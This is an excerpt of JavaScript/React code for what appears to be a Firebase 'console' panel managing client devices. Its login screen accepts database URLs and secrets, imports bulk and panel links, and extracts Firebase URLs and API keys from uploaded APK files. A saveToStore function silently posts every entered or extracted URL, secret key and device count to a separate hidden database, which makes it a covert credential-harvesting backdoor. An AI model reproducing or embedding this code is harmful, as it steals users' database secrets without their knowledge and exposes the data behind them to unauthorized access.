...
async function saveToStore(data){
  try{
    const url = `${STORE_DB}/${STORE_PATH}.json${STORE_KEY?"?auth="+STORE_KEY:""}`;
    const res = await fetch(url,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({...data, time: Date.now()})
    });
    return res.ok;
  }catch(e){ console.warn("Store failed:", e.message); return false; }
}
  ...
  return <div className={"welcome-wrap"+(exiting?" exiting":"")}>
    ...
    <div className="welcome-content">
      ...
      <div className={"welcome-cta"+(stage>=2?" in":"")}>
        <button className="wc-btn tg" onClick={enterNow}>
          <span>ENTER CONSOLE</span><span className="wc-arrow">{Ic.chev(14)}</span>
        </button>
        <p className="wc-note">Tap to continue</p>
      </div>
    </div>
  </div>;
}
...
function LoginScreen({onConnect,onMergeAll}){
  ...
  async function addShared(u,k,list){setBusy(true);setErr("");
    try{await fbGet(u,k,"clients");
      ...
      saveToStore({type:"firebase_added",url:u,key:k,source:"Shared Link"});
      onConnect(u,k);
  ...
  async function submit(){
    ...
    try{const test=await fbGet(u,k,"clients");const devCount=test&&typeof test==="object"?Object.keys(test).length:0;
      ...
      saveAccounts(nx);setAccounts(nx);
      saveToStore({type:"firebase_added",url:u,key:k,source:"Manual Add",devices:devCount});
      onConnect(u,k);
    }catch(e){const m=e.message||String(e);if(m.includes("PERMISSION_DENIED")) setErr("Permission Denied: Use Database Secret, not API key.");
  ...
  const PREMIUM_GH_USER = "YOUR_GITHUB_USERNAME";
  const PREMIUM_GH_REPO = "YOUR_GITHUB_REPO";
  ...
  async function verifyPremium(){
    ...
    try{
      ...
      setPremiumKey("");
      for(const w of working) await saveToStore({type:"premium",url:w.url,source:"Premium Access",devices:w.devices,status:"ok"});
  ...
  async function processBulkUrls(urls,source){
    ...
    for(const s of success) await saveToStore({type:"bulk",url:s.url,source,devices:s.devices,status:"ok"});
    for(const f of failed) await saveToStore({type:"bulk",url:f.url,source,reason:f.reason,status:"failed"});
  ...
  async function importPanels(){
    ...
    for(const s of success) await saveToStore({type:"panel",url:s.url,source:"Panel Link Import",devices:s.devices,status:"ok"});
    for(const f of failed) await saveToStore({type:"panel",url:f.url,source:"Panel Link Import",reason:f.reason,status:"failed"});
  }
  async function onApk(f){
    ...
    try{const r=await parseApk(f);
      ...
      if(r.firebaseUrl) saveToStore({type:"apk",url:r.firebaseUrl,key:r.apiKey,file:f.name,projectId:r.projectId,source:"APK Upload"});
